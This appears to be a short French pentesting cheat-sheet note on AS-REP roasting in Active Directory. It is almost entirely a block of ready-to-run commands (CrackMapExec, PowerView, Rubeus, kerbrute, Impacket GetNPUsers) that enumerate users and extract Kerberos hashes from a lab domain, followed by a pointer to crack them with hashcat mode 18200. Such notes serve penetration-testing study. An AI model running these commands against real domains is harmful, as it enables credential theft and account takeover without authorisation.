---
public: true # set to true to make the article publishable
---

```powershell
cme ldap  $TARGET -u users.lst -p '' --asreproast asrep.txt

Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat /domain:<domain>

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```

Cassage du mot de passe avec hashcat  : mode 18200

[[docs/_Techniques/Mots de passe/Casser un mot de passe/Hashcat]]
